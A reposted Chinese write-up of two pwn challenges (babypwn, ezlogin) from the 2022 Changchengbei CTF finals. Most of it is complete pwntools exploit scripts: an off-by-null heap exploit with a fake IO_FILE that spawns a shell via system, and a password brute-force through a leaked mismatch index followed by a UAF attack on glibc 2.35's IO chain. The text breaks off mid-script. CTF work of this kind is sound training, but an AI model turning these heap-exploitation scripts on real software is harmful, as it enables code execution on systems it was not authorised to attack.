---
title: [原创]2022长城杯决赛pwn
url: https://buaq.net/go-143701.html
source: unSafe.sh - 不安全
date: 2023-01-02
fetch_date: 2025-10-04T02:52:01.583443
---

# [原创]2022长城杯决赛pwn

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/ff2c1c0a053e8a44f0f0cd5a1138b217.jpg)

[原创]2022长城杯决赛pwn

很遗憾没能和一队一样去打国决，所以暑假里参加了长城杯。决赛的时候有一道零解的pwn题目，刚好最近想起来就做了下。决赛babypwn很明显的of
*2023-1-1 13:5:22
Author: [bbs.pediy.com(查看原文)](/jump-143701.htm)
阅读量:28
收藏*

---

很遗憾没能和一队一样去打国决，所以暑假里参加了长城杯。决赛的时候有一道零解的pwn题目，刚好最近想起来就做了下。

## 决赛

### babypwn

很明显的off by null，而且给的libc是2.27的，所以稍微调调就出来了。

```
#encoding: utf-8
#!/usr/bin/python
from pwn import*
import sys
#context.log_level = "debug"
context.arch="amd64"
binary_name = "babypwn"
libc_name = "libc.so.6"
ld_name = "ld"
local = 1
elf =ELF("./"+binary_name)
libc = ELF("./"+libc_name)
#ld = ELF("./"+ld_name)
se      = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
rc      = lambda num          		:io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda delims             :io.recvuntil(delims)
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))
info    = lambda tag, addr          :log.info(tag + " -------------> " + hex(addr))
ia		= lambda                    :io.interactive()
if local==0:
	io = remote("101.200.211.26",34088)
else:
	io = process("./"+binary_name)

def debug():
	gdb.attach(io,'''
		b exit
		''')
	pause()
def add(size,value):
	sla(">>","a")
	sla("length:",str(size))
	sla("input:",value)
def edit(index,value):
	sla(">>","e")
	sla("index:",str(index))
	sla("input:",value)
def show(index):
	sla(">>","s")
	sla("index:",str(index))
def free(index):
	sla(">>","d")
	sla("index:",str(index))
for i in range(6):
	add(0x1a0,"xxx")
for i in range(6):
	free(i)
for i in range(2):
	add(0x1a0,"yyy") #1
free(0)
add(0x210,"xxx")#0
add(0xa0,"this") #2
add(0x1f0,"this")#3
for i in range(3):
	for i in range(2):
		add(0x1f0,"xxx")
	for i in range(2):
		free(i+4)
add(0x1f0,"xxx")
free(4)
for i in range(3):
	for i in range(2):
		add(0xa0,"yyy")
	for i in range(2):
		free(i+4)
add(0x4b0,"xxx")
add(0xa0,"yyy")

free(5)

free(1)
free(2)
add(0xa8,"yyy")#1
add(0xa0,"xxx")#2
payload = "\x00"*0xa0+p64(0x100+0x220+0xb0)
edit(1,payload)
free(3)
add(0xf0,"yyy")
show(0)
ru("content:")
libcbase = uu64(io.recv(6)) - 4111520
stderr_chain = libcbase + 4114152

info("libcbase",libcbase)
system_addr=libcbase+libc.sym['system']
payload = p64(libcbase+4112576)*2+p64(4114016+libcbase-0x20)*2
add(0x500,"xxx")
edit(0,"a"*0xf)
show(0)
ru("a"*0xf+"\n")
heap_addr = uu64(io.recv(6))
info("heap_addr",heap_addr)
edit(0,payload)
one = [0x4f2a5,0x4f302,0x10a2fc]

fake_IO_FILE = p64(0)*4
fake_IO_FILE +="/bin/sh\x00"*2
fake_IO_FILE +=p64(1)+p64(0)
fake_IO_FILE +=p64(heap_addr+5872)#rdx
fake_IO_FILE +=p64(system_addr)#call addr
fake_IO_FILE +=p64(0xffffffffffffffff)
fake_IO_FILE = fake_IO_FILE.ljust(0x38, '\x00')
fake_IO_FILE += p64(0 )  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(libcbase+4118704)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE +=p64(heap_addr+5928)+p64(heap_addr+5872+0x30) #rax1
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(libcbase+4095376)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(heap_addr+48)  # rax2
edit(4,fake_IO_FILE)

free(4)
add(0x500,"xxx")
debug()
sl("q")
ia()
```

### ezlogin

这道题目的漏洞难找

漏洞是很明确的，给了一个uaf后门，前提是登录Sweetheart的账号

![](https://bbs.pediy.com/upload/attach/202301/951445_B7N4VJDZPK3HTT5.jpg)

而Sweetheart的密码是随机的，种子也无法猜出来。

看似无懈可击，以至于让我一直以为有别的漏洞。

让我们看向check函数这里

![](https://bbs.pediy.com/upload/attach/202301/951445_JGYUANTZGSA3NWM.jpg)

i变量在v2后面，而v2是我们要输入的密码，如果长度为0x40个且密码错误则会将第几个错误的位数也打印出来。至此，我们可以用爆破的方法将Sweetheart的密码给搞出来，然后利用后门uaf。

```
def exploit(index,num,pwd=''):
	password =pwd
	# print(len(password))
	tmp = ''
	for i in range(len(password)+1,num+1):
		for j in range(15,0xff+1):
			tmp = password
			tmp += p8(j)
			tmp = tmp.ljust(64,"b")
			# print(tmp)
			login(index,tmp)
			s = io.recvline()
			if s == 'Login success!\n':
				return password
			if i==10:
				if(ord(s[-2])!=9):
					password +=p8(j)
					break
			if i == ord(s[-2]):
				password +=p8(j)
				break
	return password[0:num+1]
```

给的libc是2.35，且申请的为大堆块，选个合适的io链攻击就行。

```
#encoding: utf-8
#!/usr/bin/python
from pwn import*
import sys
# context.log_level = "debug"
context.arch="amd64"
binary_name = "pwn"
libc_name = "libc.so.6"
ld_name = "ld"
local = 1
elf =ELF("./"+binary_name)
libc = ELF("./"+libc_name)

#ld = ELF("./"+ld_name)
se      = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
rc      = lambda num          		:io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda delims             :io.recvuntil(delims)
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))
info    = lambda tag, addr          :log.info(tag + " -------------> " + hex(addr))
ia		= lambda                    :io.interactive()
if local==0:
	io = remote()
else:
	io = process("./"+binary_name)

def debug():
	gdb.attach(io,'''
		''')
	pause()
def add(index,size,length,passwd):
	sla(b">> ",b"1")
	sla(b"index: ",str(index))
	sla(b"size: ",str(size))
	sla(b"len: ",str(length))
	sla(b"password: ",passwd)

def edit(index,length,passwd):
	sla(b">> ",b"4")
	sla(b"index: ",str(index))
	sla(b"len: ",str(length))
	sla(b"password: ",passwd)
def login(index,passwd):
	sla(b">> ",b"2")
	sla(b"index: ",str(index))
	sa(b"password: ",passwd)
def free(index,passwd):
	login(index,passwd)
	sla(b">> ",b"3")
	sla(b"index: ",str(index))
def exploit(index,num,pwd=''):
	password =pwd
	# print(len(password))
	tmp = ''
	for i in range(len(password)+1,num+1):
		for j in range(15,0xff+1):
			tmp = password
			tmp += p8(j)
			tmp = tmp.ljust(64,"b")
			# print(tmp)
			login(index,tmp)
			s = io.recvline()
			if s == 'Login success!\n':
				return password
			if i==10:
				if(ord(s[-2])!=9):
					password +=p8(j)
					break
			if i == ord(s[-2]):
				password +=p8(j)
				break
	return password[0:num+1]
passwd=""

add(1,0x440,0x40,b"a"*0x40)
add(2,0x440,0x40,b'a'*0x40)
add(3,0x430,0x40,b'a'*0x40)
login(1,b'a'*0x40)
passwd = exploit(0,64)
sla("index: ","1")
add(4,0x450,0x40,b'a'*0x40)
libcbase=uu64(exploit(1,8,p8(0xe0))) - 2203872
# libcbase = 0x7ffff7d93000
info("libcbase",libcbase)
list_all_adr = libcbase + 2205312
mp_addr = libcbase + 2200520
info("list_all",list_all_adr)
edit(1,0x40,p64(0)*3+p64(mp_addr-0x20))
free(3,b'a'*0x40)
add(5,0x450,0x40,b'a'*0x40)
heap_addr = uu64(exploit(1,8,p8(0x60)))
# heap_addr = 0x55555555ef60
info("heap_addr",heap_addr)
add(3,0x430,0x40,b'a'*0x40)
login(1,p64(libcbase+2203872)+p64(0)*2+p64(mp_addr-0x20)+p64(0)*4)
edit(1,0x40,p64(libcbase+2203872)*2+p64(heap_addr-2208)*2)
IO_stdout_addr = libcbase +2205568
_IO_2_1_stderr_addr = libcbase + 2205344
info("IO_stdout_addr",IO_stdout_addr)
info("_IO_2_1_stderr_addr",_IO_2_1_stderr_addr)
add(6,0x440,0x40,b"a"*0x40)
add(7,0x440,0x40,b"a"*0x40)
add(8,0x440,0x40,b"a"*0x40)
login(1,'a'*0x40)
free(8,'a'*0x40)
free(7,'a'*0x40)
free(2,'a'*0x40)
free(6,'a'*0x40)
one=[0x50a37,0xebcf1,0xebcf5,0xebcf8]
_IO_wfile_overflow = libcbase + 549904
edit(1,0x40,p64((heap_addr>>12)^(_IO_2_1_stderr_addr+0xa0)))
add(2,0x440,0x40,b'a'*0x40)
login(1,'a'*0x40)
payload = p64(heap_a...